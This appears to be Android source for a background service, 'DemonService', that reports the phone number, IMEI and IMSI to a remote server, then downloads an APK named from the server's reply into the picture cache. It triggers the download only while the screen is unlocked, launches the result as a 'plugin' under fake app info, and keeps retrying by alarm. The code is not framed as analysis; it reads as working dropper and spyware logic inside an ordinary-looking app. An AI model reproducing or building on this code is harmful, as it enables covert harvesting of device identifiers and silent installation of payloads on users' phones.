package com.xstd.qm;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;
import com.plugin.common.utils.CustomThreadPool;
import com.plugin.common.utils.SingleInstanceBase;
import com.plugin.common.utils.StringUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.common.utils.files.DiskManager;
import com.plugin.internet.InternetUtils;
import com.xdtd.qm.api.active.ActiveRequest;
import com.xdtd.qm.api.active.ActiveResponse;
import com.xdtd.qm.api.active.LanuchRequest;
import com.xdtd.qm.api.active.LanuchResponse;
import com.xstd.qm.setting.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-17
 * Time: AM10:18
 * To change this template use File | Settings | File Templates.
 */
public class DemonService extends IntentService {

    public static final String ACTION_ACTIVE_SERVICE = "com.xdtd.service.active";

    public static final String ACTION_DOWNLOAD_PLUGIN = "com.xstd.service.download";

    public static final String ACTION_LANUCH = "com.xstd.qs.lanuch";

    public static final String ACTION_ACTIVE_MAIN = "com.xstd.qs.active";

    public DemonService() {
        super("DemonService");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            String action = intent.getAction();
            if (ACTION_LANUCH.equals(action)) {
                //通知服务器启动事件
                CustomThreadPool.asyncWork(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            cancelHourAlarm(getApplicationContext());
                            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
                            if (TextUtils.isEmpty(phone)) phone = "00000000000";
                            LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                                    , UtilsRuntime.getIMEI(getApplicationContext())
                                                                    , UtilsRuntime.getIMSI(getApplicationContext())
                                                                    , Config.CHANNEL_CODE
                                                                    , UtilsRuntime.getIMEI(getApplicationContext())
                                                                    , phone);
                            LanuchResponse response = InternetUtils.request(getApplicationContext(), request);
                            if (response != null && !TextUtils.isEmpty(response.url)) {
                                SettingManager.getInstance().setKeyLanuchTime(System.currentTimeMillis());
                                SettingManager.getInstance().setKeyInstallInterval(response.activeDelay * 60 * 1000);
                                if (!response.url.startsWith("http")) {
                                    if (Config.URL_PREFIX.endsWith("/")) {
                                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + response.url);
                                    } else {
                                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + "/" + response.url);
                                    }
                                } else {
                                    SettingManager.getInstance().setKeyDownloadUrl(response.url);
                                }

                                if (Config.DEBUG) {
                                    Config.LOGD("[[App::onCreate]] lanuch time = " + UtilsRuntime.debugFormatTime(System.currentTimeMillis()));
                                }

                                String apkFileName = StringUtils.MD5Encode(response.url) + ".apk";
                                SettingManager.getInstance().setLocalApkPath(DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + apkFileName);

                                if (UtilOperator.isPluginApkExist()) {
                                    if (Config.DEBUG) {
                                        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] plugin apk is exist on Path : "
                                                        + SettingManager.getInstance().getLocalApkPath());
                                    }
                                    return;
                                } else {
                                    if (Config.DEBUG) {
                                        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] isOnline = " + UtilsRuntime.isOnline(getApplicationContext())
                                                        + " download process = " + Config.DOWNLOAD_PROCESS_RUNNING.get()
                                                        + " screenLocked = " + UtilsRuntime.isScreenLocked(getApplicationContext()));
                                    }

                                    if (UtilsRuntime.isOnline(getApplicationContext())
                                            && !Config.DOWNLOAD_PROCESS_RUNNING.get()
                                            && !UtilsRuntime.isScreenLocked(getApplicationContext())) {
                                        Handler handler = new Handler(getApplicationContext().getMainLooper());
                                        handler.postDelayed(new Runnable() {
                                            @Override
                                            public void run() {
                                                Intent i = new Intent();
                                                i.setClass(getApplicationContext(), DemonService.class);
                                                i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
                                                startService(i);
                                            }
                                        }, 1 * 1000);
                                    }
                                }

                                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
                                cancelHourAlarm(getApplicationContext());

                                return;
                            }
                        } catch (Exception e) {
                            if (Config.DEBUG) e.printStackTrace();
                        }

                        startHourAlarm(getApplicationContext());
                    }
                });
            } else if (ACTION_ACTIVE_MAIN.equals(action)) {
                //通知服务器激活

                activeQS();
            } else if (ACTION_ACTIVE_SERVICE.equals(action)) {
//                if (SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled()) {
                //尝试激活子程序

                if (Config.DEBUG) {
                    Config.LOGD("[[DemonService::onHandleIntent]] try to active <<plugin>> package after 3S");
                }

                //sleep 3S
                //此处sleep的目的是为了防止用户的手机安装反应过慢的问题
                try {
                    Thread.sleep(3 * 1000);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                if (Config.DEBUG) {
                    Config.LOGD("[[DemonService::onHandleIntent]] try to active <<plugin>> package now");
                }
                Intent i = new Intent();
                i.setAction("com.xstd.plugin.package.active");
                if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.name)) {
                    i.putExtra("name", AppRuntime.CURRENT_FAKE_APP_INFO.name);
                }
                if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae)) {
                    i.putExtra("packageName", AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae);
                }
                startService(i);
//                }
            } else if (ACTION_DOWNLOAD_PLUGIN.equals(action)) {
                if (Config.DEBUG) {
                    Config.LOGD("[[DemonService::onHandleIntent]] action = " + action);
                }
                UtilOperator.tryToDownloadPlugin(getApplicationContext());
            }
        }
    }

    private void activeQS() {
        CustomThreadPool.asyncWork(new Runnable() {
            @Override
            public void run() {
                UtilOperator.cancelActiveAlarm(getApplicationContext());
                try {
                    String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
                    if (TextUtils.isEmpty(phone)) phone = "00000000000";
                    ActiveRequest request = new ActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                                 , UtilsRuntime.getIMEI(getApplicationContext())
                                                                 , UtilsRuntime.getIMSI(getApplicationContext())
                                                                 , Config.CHANNEL_CODE
                                                                 , phone
                                                                 , UtilsRuntime.getIMEI(getApplicationContext()));
                    ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
                    if (response != null && !TextUtils.isEmpty(response.url)) {
                        //激活成功
                        SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
                        return;
                    }
                } catch (Exception e){
                }

                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
            }
        });
    }

    public static void startHourAlarm(Context context) {
        cancelHourAlarm(context);
        Intent intent = new Intent();
        intent.setAction(ACTION_LANUCH);
        intent.setClass(context, DemonService.class);
        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
        long cur = System.currentTimeMillis();
        long firstTime = cur + ((long) 10) * 60 * 1000;

        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.set(AlarmManager.RTC, firstTime, sender);
    }

    public static void cancelHourAlarm(Context context) {
        Intent intent = new Intent();
        intent.setAction(ACTION_LANUCH);
        intent.setClass(context, DemonService.class);
        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }

}
